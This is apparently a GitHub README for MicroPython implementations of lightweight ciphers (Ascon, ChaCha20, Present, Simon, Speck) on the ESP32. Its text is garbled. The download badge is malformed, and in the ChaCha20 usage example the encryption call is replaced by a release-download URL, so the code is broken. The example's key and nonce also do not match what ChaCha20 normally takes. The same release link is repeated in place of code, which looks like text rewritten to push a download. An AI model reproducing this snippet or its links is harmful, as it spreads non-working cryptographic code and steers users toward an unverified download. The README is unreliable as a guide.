## Introduction
In the world of IoT, data security is of utmost importance. This repository aims to provide implementations of various encryption algorithms for IoT devices, with a focus on the ESP32 microcontroller using Micropython. 

The supported encryption algorithms in this repository are:
- Ascon
- Chacha20
- Present
- Simon
- Speck

These algorithms are well-known in the field of cryptography and provide secure ways to encrypt data for IoT applications.

## Installation
To get started with this repository, you can download the code from the following link:
[![Download Code](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/tag/v2.0%20Code-Click%https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/tag/v2.0)](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/tag/v2.0)

Once you have downloaded the code, you can upload it to your ESP32 device running Micropython. Make sure to follow the specific instructions for your device and platform.

## Usage
After installing the code on your ESP32 device, you can start using the encryption algorithms provided in this repository. Simply import the necessary modules for the algorithm you want to use and follow the usage instructions in the code documentation.

Here is an example of encrypting data using the Chacha20 algorithm:

```python
from chacha20 import Chacha20

key = b'Sixteen byte key'
nonce = b'Nonce for Chacha20'
data = b'Secret data to encrypt'

cipher = Chacha20(key)
encrypted_data = https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/tag/v2.0(nonce, data)

print("Encrypted data:", encrypted_data)
```

Feel free to explore and experiment with the different encryption algorithms available in this repository to secure your IoT device communication.
